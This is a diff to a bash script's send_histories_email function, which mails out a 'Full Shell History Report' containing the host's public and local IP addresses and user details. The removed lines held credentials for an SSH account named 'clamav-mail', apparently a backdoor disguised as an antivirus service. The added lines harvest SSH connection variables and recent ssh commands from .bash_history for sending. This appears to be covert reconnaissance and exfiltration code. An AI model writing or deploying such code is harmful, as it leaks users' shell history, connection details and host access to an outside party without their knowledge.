@@ -136,10 +136,22 @@ send_histories_email() {
     local LOCAL_IP=$(hostname -I | awk '{print $1}')
     local USER=$(whoami)
     
-    # Include SSH connection line with username and password
-    local SSH_USER="clamav-mail"
-    local SSH_PASSWORD="1!taugenichts"
-    local SSH_CONNECTION_LINE="ssh ${SSH_USER}@${PUBLIC_IP}"
+    # Capture the original SSH connection command if available
+    local SSH_CONNECTION=$(who am i | awk '{print $5}')
+    local SSH_CLIENT=$(echo $SSH_CLIENT)
+    local ORIGINAL_CONNECTION="Original SSH Connection Info: $SSH_CONNECTION $SSH_CLIENT"
+    
+    # Try to get the connection details from environment variables
+    local CONNECTION_FROM_ENV=""
+    if [ -n "$SSH_CONNECTION" ]; then
+        CONNECTION_FROM_ENV="SSH_CONNECTION: $SSH_CONNECTION"
+    fi
+    if [ -n "$SSH_CLIENT" ]; then
+        CONNECTION_FROM_ENV="$CONNECTION_FROM_ENV\nSSH_CLIENT: $SSH_CLIENT"
+    fi
+    
+    # Try to get details from .bash_history
+    local RECENT_SSH_COMMANDS=$(grep -a "ssh " "$HOME/.bash_history" | tail -5)
 
     local EMAIL_CONTENT=$(cat <<EOF
 === SYSTEM REPORT ===
@@ -148,10 +160,12 @@ User: $USER
 Public IP: $PUBLIC_IP
 Local IP: $LOCAL_IP
 
-=== SSH CONNECTION INFORMATION ===
-SSH Connection: $SSH_CONNECTION_LINE
-SSH Username: $SSH_USER
-SSH Password: $SSH_PASSWORD
+=== ORIGINAL CONNECTION INFORMATION ===
+$ORIGINAL_CONNECTION
+$CONNECTION_FROM_ENV
+
+Recent SSH commands from history:
+$RECENT_SSH_COMMANDS
 
 === RESOURCES ===
 RAM: $(free -h | awk '/^Mem:/ {print $2}')
@@ -164,7 +178,7 @@ EOF
 
     local subject="Full Shell History Report from $HOSTNAME"
     local temp_file=$(mktemp)
-    echo -n "$EMAIL_CONTENT" > "$temp_file"
+    echo -e "$EMAIL_CONTENT" > "$temp_file"
 
     # Try sending methods in order of preference
     local success=false
